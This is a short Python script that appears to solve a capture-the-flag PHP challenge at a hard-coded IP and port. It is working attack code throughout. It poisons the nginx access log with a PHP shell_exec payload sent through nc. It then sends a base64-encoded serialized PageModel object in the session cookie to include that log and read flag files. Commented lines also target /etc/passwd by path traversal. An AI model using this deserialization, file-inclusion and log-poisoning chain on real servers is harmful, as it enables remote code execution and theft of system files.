import requests
import base64
import os

host = '178.62.63.96'; port = '32330'
# host = 'localhost'; port = '80'

os.system(f"echo \"<?php echo(shell_exec('cat /flag*')); ?>\" | nc {host} {port}")

# obj = 'O:9:"PageModel":1:{s:4:"file";s:28:"../../../../../../etc/passwd";}'
# obj = 'O:9:"PageModel":1:{s:4:"file";s:28:"../../../../../../flag_knZ25";}'
obj = 'O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}'

headers = {"Cookie": f"PHPSESSID={base64.b64encode(obj.encode()).decode()}"}

r = requests.get(f'http://{host}:{port}', headers=headers)

print(r.text)
